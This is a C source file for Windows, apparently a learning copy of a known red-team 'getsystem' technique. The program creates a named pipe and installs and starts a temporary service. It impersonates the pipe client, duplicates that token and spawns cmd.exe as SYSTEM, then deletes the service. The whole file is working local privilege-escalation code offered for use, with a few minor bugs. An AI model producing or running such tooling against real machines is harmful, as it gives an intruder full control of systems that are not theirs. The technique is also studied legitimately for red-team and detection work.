
#include <Windows.h>
#include <tchar.h>
#include <strsafe.h>

#define SERVICE_EXE "getsystem_service.exe"
#define SERVICE_NAME "Elevate"
#define PIPE_PATH "\\\\.\\pipe\\elevate"
#define MAX_PAHT 4096
BOOL SvcInstall(const char* path, const char* name);
BOOL SvcStart(const char* name);
VOID ReportSvcStatus(DWORD, DWORD, DWORD);
VOID SvcInit(DWORD, LPTSTR*);
VOID SvcReportEvent(LPTSTR);
//This is learning from github: 'xpn/getsystem-offline'


BOOL SvcInstall(const char* path, const char* name) {
	SC_HANDLE schSCManager;
	SC_HANDLE schService;

	schSCManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

	if (schSCManager == NULL) {
		return FALSE;
	}

	schService = CreateServiceA(
		schSCManager,
		name,
		name,
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		path,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);

	if (schService == NULL) {
		return FALSE;
	}

	CloseServiceHandle(schSCManager);
	CloseServiceHandle(schService);

	return TRUE;
}

BOOL SvcStart(const char* name) {
	SC_HANDLE schManager;
	SC_HANDLE schService;

	schManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

	if (schManager == NULL) {
		return FALSE;
	}
	schService = OpenServiceA(schManager, name, SERVICE_ALL_ACCESS);

	if (schManager == NULL) {
		return FALSE;
	}

	if (!StartService(schService, 0, NULL)) {
		return FALSE;
	}

	CloseServiceHandle(schManager);
	CloseServiceHandle(schService);
	return TRUE;
}

BOOL ServiceStop(const char* name) {
	SC_HANDLE scManager;
	SC_HANDLE scService;
	SERVICE_STATUS status;

	scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

	if (scManager == NULL) {
		return FALSE;
	}

	scService = OpenServiceA(
		scManager,
		name,
		SERVICE_ALL_ACCESS);

	if (scService == NULL) {
		return FALSE;
	}

	if (!ControlService(scService, SERVICE_CONTROL_STOP, &status)) {
		return FALSE;
	}

	CloseServiceHandle(scService);
	CloseServiceHandle(scManager);

	return TRUE;
}

BOOL ServiceDelete(const char* name) {
	SC_HANDLE scManager;
	SC_HANDLE scService;

	scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

	if (scManager == NULL) {
		return FALSE;
	}

	scService = OpenServiceA(
		scManager,
		name,
		SERVICE_ALL_ACCESS);

	if (scService == NULL) {
		return FALSE;
	}

	if (!DeleteService(scService)) {
		return FALSE;
	}

	CloseServiceHandle(scService);
	CloseServiceHandle(scManager);

	return TRUE;
}

int main() {
	char directory[MAX_PATH];
	char servicePath[MAX_PATH];
	char serviceName[128];
	char recv[1024];
	DWORD bytes;
	bool connected;
	HINSTANCE hinst;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	HANDLE token;
	HANDLE newtoken;
	HANDLE ptoken;

	HANDLE namedPipe = CreateNamedPipeA(PIPE_PATH,
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_MESSAGE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		1024,
		1024,
		0,
		NULL);

	if (namedPipe == INVALID_HANDLE_VALUE) {
		printf("[-] Could not create named pipe\n");
		return 0;
	}
	else {
		printf("[+] Named pipe created: %s\n", PIPE_PATH);
	}

	srand(GetTickCount());
	GetModuleFileNameA(LoadLibraryA(SERVICE_EXE), servicePath, sizeof(servicePath));
	snprintf(serviceName, sizeof(serviceName), "%s%d%d", SERVICE_NAME, rand(), rand());

	printf("[+] Creating service %s\n", serviceName);

	if (!SvcInstall(servicePath, serviceName)) {
		printf("[-] Error creating service\n");
		return 0;
	}
	else {
		printf("[+] Service installed (%s)\n", serviceName);
	}

	if (!SvcStart(serviceName)) {
		printf("[-] Error starting service\n");
		ServiceDelete(serviceName);
		return 0;
	}
	else {
		printf("[+] Service starting (%s)\n", serviceName);
	}

	connected = ConnectNamedPipe(namedPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (connected) {
		for (;;) {
			printf("[+] Waiting for pipe connection..\n");

			ZeroMemory(recv, sizeof(recv));

			ReadFile(namedPipe, recv, sizeof(recv), &bytes, NULL);

			printf("[+] Read %d Bytes: %s\n", bytes, recv);

			printf("[+] Attempting to impersonate client\n");
			if (ImpersonateNamedPipeClient(namedPipe) == 0) {
				printf("[+] Error impersonating clinet\n");
				return 0;
			}

			if (!ServiceStop(serviceName)) {
				printf("[-] Error stopping service\n");
			}
			else {
				printf("[+] Service cleaned up\n");
			}

			if (!ServiceDelete(serviceName)) {
				printf("[-] Error deleting service\n");
				printf("[-] Please delete the service %s manually\n", serviceName);
			}

			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &token)) {
				printf("[-] Error opening thread token\n");
			}

			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &ptoken)) {
				printf("[-] Error opening process token\n");
			}

			if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newtoken)) {
				printf("[-] Error duplicating thread token\n");
			}

			printf("[+] Impersonated SYSTEM user successfully\n");
			char cmdline[] = "cmd.exe";
			if (!CreateProcessAsUserA(newtoken, NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
				printf("[-] CreateProcessAsUser failed (%d), trying another method\n", GetLastError());

				ZeroMemory(&si, sizeof(si));
				si.cb = sizeof(si);
				ZeroMemory(&pi, sizeof(pi));
				wchar_t cmdlinew[] = L"cmd.exe";
				if (!CreateProcessWithTokenW(newtoken, LOGON_NETCREDENTIALS_ONLY, NULL, cmdlinew, NULL, NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
					printf("[-] CreateProcessWithToken failed (%d)\n", GetLastError());
					return 0;
				}
			}

			printf("[+] All Done \n");
			getchar();


			return 0;
		}
	}

	return 0;
}